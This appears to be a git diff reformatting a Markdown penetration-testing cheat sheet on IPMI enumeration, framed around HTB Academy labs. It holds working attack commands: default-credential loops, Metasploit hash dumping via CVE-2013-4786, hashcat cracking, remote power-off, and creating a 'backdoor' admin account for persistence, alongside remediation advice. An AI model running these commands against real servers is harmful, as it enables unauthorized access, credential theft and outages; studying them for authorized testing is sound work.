@@ -1,66 +1,74 @@
-# IPMI (Intelligent Platform Management Interface) Enumeration
+# ⚙️ IPMI Enumeration
 
 ## Overview
+
 IPMI (Intelligent Platform Management Interface) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. IPMI can be used to manage a server or network device before the OS is installed, during OS runtime, or even when the system is powered off.
 
 **Key Characteristics:**
-- **Port 623**: IPMI over UDP
-- **Purpose**: Remote system management, monitoring, and control
-- **Independence**: Functions independently of the main OS
-- **Access**: Direct hardware-level access to systems
-- **Authentication**: Username/password based with various privilege levels
+
+* **Port 623**: IPMI over UDP
+* **Purpose**: Remote system management, monitoring, and control
+* **Independence**: Functions independently of the main OS
+* **Access**: Direct hardware-level access to systems
+* **Authentication**: Username/password based with various privilege levels
 
 ## IPMI Components
 
 ### BMC (Baseboard Management Controller)
-- **Function**: Microprocessor that monitors the server
-- **Independence**: Operates independently of the main CPU and OS
-- **Power**: Continuously powered (even when server is off)
-- **Access**: Provides hardware access to system components
-- **Communication**: Interfaces with various system sensors and components
+
+* **Function**: Microprocessor that monitors the server
+* **Independence**: Operates independently of the main CPU and OS
+* **Power**: Continuously powered (even when server is off)
+* **Access**: Provides hardware access to system components
+* **Communication**: Interfaces with various system sensors and components
 
 ### Management Console
-- **Purpose**: Interface for administrators to interact with IPMI
-- **Access Methods**: Web interface, command-line tools, SNMP
-- **Functionality**: System monitoring, power management, configuration
-- **Remote Access**: Allows remote management of systems
+
+* **Purpose**: Interface for administrators to interact with IPMI
+* **Access Methods**: Web interface, command-line tools, SNMP
+* **Functionality**: System monitoring, power management, configuration
+* **Remote Access**: Allows remote management of systems
 
 ### IPMI Protocol Stack
-| Layer | Description |
-|-------|-------------|
-| **Application Layer** | Commands and responses |
-| **Session Layer** | Authentication and session management |
-| **Message Layer** | Message formatting and routing |
-| **Transport Layer** | UDP/TCP communication |
+
+| Layer                 | Description                           |
+| --------------------- | ------------------------------------- |
+| **Application Layer** | Commands and responses                |
+| **Session Layer**     | Authentication and session management |
+| **Message Layer**     | Message formatting and routing        |
+| **Transport Layer**   | UDP/TCP communication                 |
 
 ## IPMI Versions and Authentication
 
 ### IPMI Version Comparison
-| Version | Authentication | Encryption | Security Features |
-|---------|---------------|------------|------------------|
-| **IPMI 1.5** | MD5 hash | None | Basic authentication, no encryption |
-| **IPMI 2.0** | HMAC-based | AES encryption | Enhanced authentication, encrypted sessions |
+
+| Version      | Authentication | Encryption     | Security Features                           |
+| ------------ | -------------- | -------------- | ------------------------------------------- |
+| **IPMI 1.5** | MD5 hash       | None           | Basic authentication, no encryption         |
+| **IPMI 2.0** | HMAC-based     | AES encryption | Enhanced authentication, encrypted sessions |
 
 ### Authentication Types
-- **None**: No authentication required
-- **MD2**: MD2 hash-based authentication
-- **MD5**: MD5 hash-based authentication  
-- **Straight Password**: Plain text password
-- **OEM**: Vendor-specific authentication
+
+* **None**: No authentication required
+* **MD2**: MD2 hash-based authentication
+* **MD5**: MD5 hash-based authentication
+* **Straight Password**: Plain text password
+* **OEM**: Vendor-specific authentication
 
 ## IPMI Privilege Levels
 
-| Level | Description | Capabilities |
-|-------|-------------|--------------|
-| **Callback** | Lowest privilege | Basic system information |
-| **User** | Standard user | System monitoring, some control |
-| **Operator** | Operator level | Power management, system control |
+| Level             | Description       | Capabilities                       |
+| ----------------- | ----------------- | ---------------------------------- |
+| **Callback**      | Lowest privilege  | Basic system information           |
+| **User**          | Standard user     | System monitoring, some control    |
+| **Operator**      | Operator level    | Power management, system control   |
 | **Administrator** | Highest privilege | Full system control, configuration |
-| **OEM** | Vendor-specific | Custom vendor functions |
+| **OEM**           | Vendor-specific   | Custom vendor functions            |
 
 ## Default Configuration Issues
 
 ### Common Misconfigurations
+
 1. **Default Credentials**: Many systems ship with default usernames/passwords
 2. **Weak Passwords**: Simple or commonly known passwords
 3. **Network Exposure**: IPMI accessible from external networks
@@ -68,6 +76,7 @@ IPMI (Intelligent Platform Management Interface) is a set of standardized specif
 5. **Version Vulnerabilities**: Using vulnerable IPMI versions
 
 ### Common Default Credentials
+
 ```bash
 # Common default IPMI credentials
 admin:admin
@@ -80,17 +89,18 @@ user:user
 
 ## Dangerous Settings
 
-| Setting | Description | Risk Level |
-|---------|-------------|------------|
-| **Anonymous Access** | No authentication required | Critical |
-| **Default Passwords** | Factory default credentials | High |
-| **Network Accessible** | IPMI accessible from WAN | High |
-| **IPMI 1.5** | Vulnerable version with weak authentication | Medium |
-| **Null Username** | Empty username accepted | High |
+| Setting                | Description                                 | Risk Level |
+| ---------------------- | ------------------------------------------- | ---------- |
+| **Anonymous Access**   | No authentication required                  | Critical   |
+| **Default Passwords**  | Factory default credentials                 | High       |
+| **Network Accessible** | IPMI accessible from WAN                    | High       |
+| **IPMI 1.5**           | Vulnerable version with weak authentication | Medium     |
+| **Null Username**      | Empty username accepted                     | High       |
 
 ## Enumeration Techniques
 
 ### 1. Service Detection
+
 ```bash
 # Nmap IPMI detection
 nmap -sU -p623 target
@@ -103,6 +113,7 @@ nmap -sU -p623 --script ipmi-version target_network/24
 ```
 
 ### 2. IPMI Version Detection
+
 ```bash
 # Basic version detection
 nmap -sU -p623 --script ipmi-version target
@@ -120,6 +131,7 @@ nmap -sU -p623 --script ipmi-version target
 ```
 
 ### 3. Authentication Testing
+
 ```bash
 # Test for cipher zero vulnerability (IPMI 2.0)
 nmap -sU -p623 --script ipmi-cipher-zero target
@@ -134,6 +146,7 @@ nmap -sU -p623 --script ipmi-cipher-zero target
 ```
 
 ### 4. Default Credential Testing
+
 ```bash
 # Manual testing with ipmitool
 ipmitool -I lanplus -H target -U admin -P admin user list
@@ -146,6 +159,7 @@ ipmitool -I lanplus -H target -U admin -P password sdr list
 ## Advanced Enumeration
 
 ### Using ipmitool
+
 ```bash
 # Basic IPMI connection test
 ipmitool -I lanplus -H target -U username -P password chassis status
@@ -162,6 +176,7 @@ ipmitool -I lanplus -H target -U username -P password power status
 ```
 
 ### Using Metasploit
+
 ```bash
 # IPMI version scan
 use auxiliary/scanner/ipmi/ipmi_version
@@ -181,6 +196,7 @@ run
 ```
 
 ### Hash Extraction and Cracking
+
 ```bash
 # Extract hashes using ipmi_dumphashes
 use auxiliary/scanner/ipmi/ipmi_dumphashes
@@ -198,6 +214,7 @@ hashcat -m 7300 ipmi_hashes.txt wordlist.txt
 ## Vulnerability Assessment
 
 ### IPMI 2.0 RAKP Authentication Bypass
+
 ```bash
 # Test for RAKP vulnerability
 nmap -sU -p623 --script ipmi-cipher-zero target
@@ -212,6 +229,7 @@ hashcat -m 7300 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ### Common IPMI Vulnerabilities
+
 1. **CVE-2013-4786**: IPMI 2.0 RAKP authentication bypass
 2. **Default Credentials**: Factory default passwords
 3. **Weak Authentication**: Insufficient authentication mechanisms
@@ -220,6 +238,7 @@ hashcat -m 7300 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ## Practical Examples
 
 ### HTB Academy Style Enumeration
+
 ```bash
 # Step 1: Service detection
 nmap -sU -p623 --script ipmi-version target
@@ -240,6 +259,7 @@ ipmitool -I lanplus -H target -U admin -P cracked_password chassis status
 ```
 
 ### HTB Academy Lab Questions Examples
+
 ```bash
 # Question 1: "What is the IPMI version running on the remote host?"
 nmap -sU -p623 --script ipmi-version target
@@ -263,6 +283,7 @@ hashcat -m 7300 hash.txt wordlist.txt
 ```
 
 ### Real-World Scenario
+
 ```bash
 # Complete IPMI enumeration workflow
 # 1. Discovery
@@ -292,6 +313,7 @@ ipmitool -I lanplus -H target -U admin -P cracked_password user list
 ## Information Gathering
 
 ### System Information
+
 ```bash
 # Hardware information
 ipmitool -I lanplus -H target -U user -P pass fru list
@@ -307,6 +329,7 @@ ipmitool -I lanplus -H target -U user -P pass lan print
 ```
 
 ### User Management
+
 ```bash
 # List users
 ipmitool -I lanplus -H target -U admin -P pass user list
@@ -321,6 +344,7 @@ ipmitool -I lanplus -H target -U admin -P pass user priv 2 4
 ## Attack Vectors
 
 ### 1. Password Hash Extraction
+
 ```bash
 # Extract password hashes via RAKP vulnerability
 use auxiliary/scanner/ipmi/ipmi_dumphashes
@@ -330,6 +354,7 @@ hashcat -m 7300 hashes.txt wordlist.txt
 ```
 
 ### 2. Default Credential Access
+
 ```bash
 # Test default credentials
 for user in admin root ADMIN; do
@@ -340,6 +365,7 @@ done
 ```
 
 ### 3. Power Management Attacks
+
 ```bash
 # Power off system
 ipmitool -I lanplus -H target -U admin -P pass power off
@@ -354,32 +380,37 @@ ipmitool -I lanplus -H target -U admin -P pass power reset
 ## Enumeration Checklist
 
 ### Initial Discovery
-- [ ] Port scan for 623/UDP
-- [ ] IPMI version detection
-- [ ] Service availability confirmation
-- [ ] Network accessibility assessment
+
+* [ ] Port scan for 623/UDP
+* [ ] IPMI version detection
+* [ ] Service availability confirmation
+* [ ] Network accessibility assessment
 
 ### Vulnerability Assessment
-- [ ] Cipher zero vulnerability testing
-- [ ] Authentication bypass attempts
-- [ ] Default credential testing
-- [ ] Version-specific vulnerability checks
+
+* [ ] Cipher zero vulnerability testing
+* [ ] Authentication bypass attempts
+* [ ] Default credential testing
+* [ ] Version-specific vulnerability checks
 
 ### Information Gathering
-- [ ] User account enumeration
-- [ ] System information extraction
-- [ ] Hardware configuration analysis
-- [ ] Network configuration review
+
+* [ ] User account enumeration
+* [ ] System information extraction
+* [ ] Hardware configuration analysis
+* [ ] Network configuration review
 
 ### Security Testing
-- [ ] Password hash extraction
-- [ ] Privilege escalation testing
-- [ ] Power management access
-- [ ] Configuration modification attempts
+
+* [ ] Password hash extraction
+* [ ] Privilege escalation testing
+* [ ] Power management access
+* [ ] Configuration modification attempts
 
 ## Tools and Techniques
 
 ### Essential IPMI Tools
+
 ```bash
 # Command-line tools
 ipmitool             # Primary IPMI management tool
@@ -396,6 +427,7 @@ john                 # John the Ripper
 ```
 
 ### Tool Installation
+
 ```bash
 # Install ipmitool
 sudo apt install ipmitool
@@ -408,6 +440,7 @@ sudo apt install freeipmi-tools
 ```
 
 ### Custom Scripts
+
 ```bash
 # IPMI scanner
 #!/bin/bash
@@ -434,6 +467,7 @@ done
 ## Defensive Measures
 
 ### Secure IPMI Configuration
+
 ```bash
 # Change default passwords
 ipmitool -I lanplus -H target -U admin -P admin user set password 2 strong_password
@@ -449,6 +483,7 @@ ipmitool -I lanplus -H target -U admin -P pass user disable 1
 ```
 
 ### Best Practices
+
 1. **Change Default Passwords**: Use strong, unique passwords
 2. **Network Segmentation**: Isolate IPMI on management network
 3. **Regular Updates**: Keep BMC firmware updated
@@ -456,6 +491,7 @@ ipmitool -I lanplus -H target -U admin -P pass user disable 1
 5. **Monitoring**: Log and monitor IPMI access attempts
 
 ### Detection and Monitoring
+
 ```bash
 # Monitor IPMI access attempts
 # Check BMC logs for authentication failures
@@ -466,23 +502,27 @@ ipmitool -I lanplus -H target -U admin -P pass user disable 1
 ## Common Vulnerabilities
 
 ### IPMI 2.0 RAKP Authentication Bypass
-- **CVE**: CVE-2013-4786
-- **Impact**: Password hash extraction
-- **Mitigation**: Disable cipher zero, use strong passwords
+
+* **CVE**: CVE-2013-4786
+* **Impact**: Password hash extraction
+* **Mitigation**: Disable cipher zero, use strong passwords
 
 ### Default Credentials
-- **Issue**: Factory default passwords
-- **Impact**: Unauthorized system access
-- **Mitigation**: Change all default passwords
+
+* **Issue**: Factory default passwords
+* **Impact**: Unauthorized system access
+* **Mitigation**: Change all default passwords
 
 ### Network Exposure
-- **Issue**: IPMI accessible from untrusted networks
-- **Impact**: Remote unauthorized access
-- **Mitigation**: Network segmentation, firewall rules
+
+* **Issue**: IPMI accessible from untrusted networks
+* **Impact**: Remote unauthorized access
+* **Mitigation**: Network segmentation, firewall rules
 
 ## Hash Cracking Techniques
 
 ### Hashcat IPMI Mode
+
 ```bash
 # IPMI hash format (mode 7300)
 hashcat -m 7300 -a 0 hash.txt wordlist.txt
@@ -495,6 +535,7 @@ hashcat -m 7300 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
 ### John the Ripper
+
 ```bash
 # Convert hash format if needed
 john --format=ipmi hash.txt
@@ -506,6 +547,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ## Post-Exploitation
 
 ### System Control
+
 ```bash
 # Power management
 ipmitool -I lanplus -H target -U admin -P pass power on
@@ -520,6 +562,7 @@ ipmitool -I lanplus -H target -U admin -P pass chassis bootdev pxe
 ```
 
 ### Persistence
+
 ```bash
 # Create new user account
 ipmitool -I lanplus -H target -U admin -P pass user set name 3 backdoor
@@ -531,6 +574,7 @@ ipmitool -I lanplus -H target -U admin -P pass user enable 3
 ## Remediation
 
 ### Immediate Actions
+
 1. **Change all default passwords**
 2. **Disable unnecessary user accounts**
 3. **Update BMC firmware**
@@ -538,6 +582,7 @@ ipmitool -I lanplus -H target -U admin -P pass user enable 3
 5. **Enable logging and monitoring**
 
 ### Long-term Security
+
 1. **Regular password rotation**
 2. **Network segmentation**
 3. **Vulnerability scanning**
